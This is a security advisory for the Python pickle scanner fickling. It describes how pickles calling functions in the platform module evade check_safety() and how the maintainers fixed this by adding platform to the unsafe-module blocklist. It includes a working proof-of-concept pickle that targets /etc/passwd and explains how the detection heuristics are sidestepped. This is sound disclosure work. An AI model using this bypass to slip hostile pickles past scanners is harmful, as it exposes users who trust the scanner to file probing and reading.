# [M] fickling's `platform` module subprocess invocation evades `check_safety()` with `LIKELY_SAFE`

## Summary
Severity: Medium
Advisory: GHSA-5cxw-w2xg-2m8h
CWE: CWE-184
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-5cxw-w2xg-2m8h
Type: github-advisory

## Affected
- PyPI: `fickling` — affected >=0 <0.1.10

## Details
# Our assessment

We added `platform` to the blocklist of unsafe modules (https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975). 

It was not possible to inject extra arguments to `file` without first monkey-patching `platform._follow_symlinks` with the pickle, as it always returns an absolute path. We independently hardened it with https://github.com/trailofbits/fickling/commit/b9e690c5a57ee9cd341de947fc6151959f4ae359 to reduce the risk of obtaining direct module references while evading detection.

https://github.com/python/cpython/blob/6d1e9ceed3e70ebc39953f5ad4f20702ffa32119/Lib/platform.py#L687-L695
```python
target = _follow_symlinks(target)
# "file" output is locale dependent: force the usage of the C locale
# to get deterministic behavior.
env = dict(os.environ, LC_ALL='C')
try:
    # -b: do not prepend filenames to output lines (brief mode)
    output = subprocess.check_output(['file', '-b', target],
                                     stderr=subprocess.DEVNULL,
                                     env=env)
```

# Original report

## Summary
A crafted pickle invoking `platform._syscmd_file`, `platform.architecture`, or `platform.libc_ver` passes `check_safety()` with `Severity.LIKELY_SAFE` and zero findings. During `fickling.loads()`, these functions invoke `subprocess.check_output` with attacker-controlled arguments or read arbitrary files from disk.

**Clarification:** The subprocess call uses a list argument (`['file', '-b', target]`), not `shell=True`, so the attacker controls the file path argument to the `file` command, not the command itself. The impact is subprocess invocation with attacker-controlled arguments and information disclosure (file type probing), not arbitrary command injection.

## Affected versions
`<= 0.1.9` (verified on upstream HEAD as of 2026-03-04)

## Non-duplication check against published Fickling GHSAs
No published advisory covers `platform` module false-negative bypass. This follows the same structural pattern as GHSA-5hwf-rc88-82xm (missing modules in `UNSAFE_IMPORTS`) but covers a distinct set of functions.

## Root cause
1. `platform` not in `UNSAFE_IMPORTS` denylist.
2. `OvertlyBadEvals` skips calls imported from stdlib modules.
3. `UnusedVariables` heuristic neutralized by making call result appear used (`SETITEMS` path).

## Reproduction (clean upstream)
```python
from unittest.mock import patch
import fickling
import fickling.fickle as op
from fickling.fickle import Pickled
from fickling.analysis import check_safety

pickled = Pickled([
    op.Proto.create(4),
    op.ShortBinUnicode('platform'),
    op.ShortBinUnicode('_syscmd_file'),
    op.StackGlobal(),
    op.ShortBinUnicode('/etc/passwd'),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),
    op.EmptyDict(),
    op.ShortBinUnicode('init'),
    op.ShortBinUnicode('x'),
    op.SetItem(),
    op.Mark(),
    op.ShortBinUnicode('trace'),
    op.BinGet(0),
    op.SetItems(),
    op.Stop(),
])

results = check_safety(pickled)
print(results.severity.name, len(results.results))  # LIKELY_SAFE 0

with patch('subprocess.check_output', return_value=b'ASCII text') as mock_sub:
    fickling.loads(pickled.dumps())
    print('subprocess called?', mock_sub.called)       # True
    print('args:', mock_sub.call_args[0])               # (['file', '-b', '/etc/passwd'],)
```

Additional affected functions (same pattern):
- `platform.architecture('/etc/passwd')` — calls `_syscmd_file` internally
- `platform.libc_ver('/etc/passwd')` — opens and reads arbitrary file contents

## Minimal patch diff
```diff
--- a/fickling/fickle.py
+++ b/fickling/fickle.py
@@
+        "platform",
```

## Validation after patch
- Same PoC flips to `LIKELY_OVERTLY_MALICIOUS`
- `fickling.loads` raises `UnsafeFileError`
- `subprocess.check_output` is not called

## Impact
- **False-negative verdict:** `check_safety()` returns `LIKELY_SAFE` with zero findings for a pickle that invokes a subprocess with attacker-controlled arguments.
- **Subprocess invocation:** `platform._syscmd_file` calls `subprocess.check_output(['file', '-b', target])` where `target` is attacker-controlled. The `file` command reads file headers and returns type information, enabling file existence and type probing.
- **File read:** `platform.libc_ver` opens and reads chunks of an attacker-specified file path.

## References
- https://github.com/trailofbits/fickling/security/advisories/GHSA-5cxw-w2xg-2m8h
- https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975
- https://github.com/trailofbits/fickling
- https://github.com/trailofbits/fickling/releases/tag/v0.1.10
